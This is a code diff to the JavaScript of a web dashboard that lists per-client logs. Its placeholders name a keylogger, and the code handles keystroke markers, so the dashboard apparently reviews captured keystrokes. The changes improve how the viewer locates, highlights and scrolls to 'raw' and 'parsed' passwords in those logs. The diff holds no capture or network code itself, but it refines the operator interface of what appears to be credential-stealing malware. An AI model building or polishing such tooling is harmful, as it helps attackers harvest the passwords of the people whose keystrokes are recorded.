@@ -798,7 +798,7 @@ function renderLogsTable(logs, clientId) {
 }
 
 async function viewLog(clientId, filename, options = {}) {
-     const { password = '', rawPassword = '' } = options;  // 解构参数
+    const { password = '', rawPassword = '' } = options;  // 解构参数
     try {
         const response = await fetch(`/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}/raw`);
         const content = await response.text();
@@ -807,18 +807,33 @@ async function viewLog(clientId, filename, options = {}) {
         currentLogContent = content;
         currentLogClientId = clientId;
         currentLogFilename = filename;
-        currentLogHighlightPassword = options.password || '';
-        currentLogHighlightRaw = options.rawPassword || '';
-        currentLogScrollTarget = options.rawPassword || options.password || '';
+        currentLogHighlightPassword = password || '';
+        currentLogHighlightRaw = rawPassword || '';
+        currentLogScrollTarget = rawPassword || password || '';
 
-        // 自动定位到包含高亮词的页码
+        // 智能页码定位
         if (currentLogScrollTarget) {
-            const index = content.indexOf(currentLogScrollTarget);
+            // 先尝试精确匹配
+            let searchText = currentLogScrollTarget.replace(/↵/g, '\n');
+            let index = content.indexOf(searchText);
+            
+            // 如果精确匹配失败，尝试模糊匹配（移除按键标记）
+            if (index === -1 && rawPassword) {
+                searchText = rawPassword.replace(/↵/g, '').replace(/\[[^\]]+\]/g, '').trim();
+                if (searchText) {
+                    index = content.indexOf(searchText);
+                }
+            }
+            
+            // 如果还失败，尝试匹配解析后的密码
+            if (index === -1 && password) {
+                index = content.indexOf(password);
+            }
+            
             if (index !== -1) {
-                // 找到目标字符所在行数
                 const before = content.substring(0, index);
                 const lineNumber = before.split('\n').length;
-                currentLogPage = Math.ceil(lineNumber / LOG_PAGE_SIZE);
+                currentLogPage = Math.max(1, Math.ceil(lineNumber / LOG_PAGE_SIZE));
             } else {
                 currentLogPage = 1;
             }
@@ -1254,7 +1269,7 @@ function renderLogPage() {
     // 规范化换行，避免 CRLF 导致搜索失败
     let content = currentLogContent.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
 
-    // 步骤 1：在原始文本中插入高亮占位符（使用安全文本占位符，避免控制字符问题）
+    // 步骤 1：在原始文本中插入高亮占位符
     const rawStart = '[[[KEYLOGGER_RAW_START]]]';
     const rawEnd = '[[[KEYLOGGER_RAW_END]]]';
     const pwdStart = '[[[KEYLOGGER_PWD_START]]]';
@@ -1263,18 +1278,23 @@ function renderLogPage() {
     // 处理原始密码高亮（优先）
     let rawHighlighted = false;
     if (currentLogHighlightRaw) {
-        const rawSearchText = currentLogHighlightRaw.replace(/↵/g, '\n');
-        const rawPattern = escapeRegexSpecialChars(rawSearchText)
-            .replace(/\n/g, '(?:\\r\\n|\\n)');
-        const rawRegex = new RegExp(rawPattern, 'gi');
-        const replaced = content.replace(
-            rawRegex,
-            (match) => {
-                rawHighlighted = true;
-                return `${rawStart}${match}${rawEnd}`;
-            }
-        );
+        // 策略1：精确匹配 - 将 ↵ 替换为 \n 进行精确匹配
+        let rawSearchText = currentLogHighlightRaw.replace(/↵/g, '\n');
+        let rawPattern = escapeRegexSpecialChars(rawSearchText).replace(/\n/g, '(?:\\r\\n|\\n|\\r)');
+        let rawRegex = new RegExp(rawPattern, 'gi');
+        let replaced = content.replace(rawRegex, (match) => { rawHighlighted = true; return `${rawStart}${match}${rawEnd}`; });
         content = replaced;
+
+        // 策略2：如果精确匹配失败，尝试模糊匹配（移除特殊标记）
+        if (!rawHighlighted) {
+            rawSearchText = currentLogHighlightRaw.replace(/↵/g, '').replace(/\[[^\]]+\]/g, '').trim();
+            if (rawSearchText) {
+                rawPattern = escapeRegexSpecialChars(rawSearchText);
+                rawRegex = new RegExp(rawPattern, 'gi');
+                replaced = content.replace(rawRegex, (match) => { rawHighlighted = true; return `${rawStart}${match}${rawEnd}`; });
+                content = replaced;
+            }
+        }
     }
 
     // 处理解析后密码高亮
@@ -1284,10 +1304,7 @@ function renderLogPage() {
         if (shouldAttemptPassword) {
             const replaced = content.replace(
                 new RegExp(escapeRegexSpecialChars(currentLogHighlightPassword), 'gi'),
-                (match) => {
-                    pwdHighlighted = true;
-                    return `${pwdStart}${match}${pwdEnd}`;
-                }
+                (match) => { pwdHighlighted = true; return `${pwdStart}${match}${pwdEnd}`; }
             );
             content = replaced;
         }
@@ -1334,18 +1351,33 @@ function renderLogPage() {
         }
     }
 
-    // 步骤 6：自动滚动到高亮区域
+    // 步骤 6：自动滚动到高亮区域 - 更智能的定位
     if (currentLogScrollTarget) {
         setTimeout(() => {
-            const highlight = document.querySelector('.raw-password-highlight')
-                           || document.querySelector('.password-highlight');
+            let highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
             if (highlight) {
                 highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                // 闪烁效果
                 highlight.classList.add('blink');
                 setTimeout(() => highlight.classList.remove('blink'), 2000);
             } else {
-                logContentEl.scrollTop = 0;
+                // 如果没有高亮，尝试搜索原始文本中的关键片段
+                let searchFragment = currentLogScrollTarget.replace(/↵/g, '');
+                // 移除按键标记，只保留可打印字符
+                searchFragment = searchFragment.replace(/\[[^\]]+\]/g, '').substring(0, 50);
+                if (searchFragment && searchFragment.trim()) {
+                    const contentText = logContentEl.textContent || '';
+                    const index = contentText.indexOf(searchFragment);
+                    if (index !== -1) {
+                        // 计算大致滚动位置
+                        const linesBefore = contentText.substring(0, index).split('\n').length;
+                        const approxScroll = Math.max(0, (linesBefore - 5) * 16);
+                        logContentEl.scrollTop = approxScroll;
+                    } else {
+                        logContentEl.scrollTop = 0;
+                    }
+                } else {
+                    logContentEl.scrollTop = 0;
+                }
             }
         }, 100);
     }
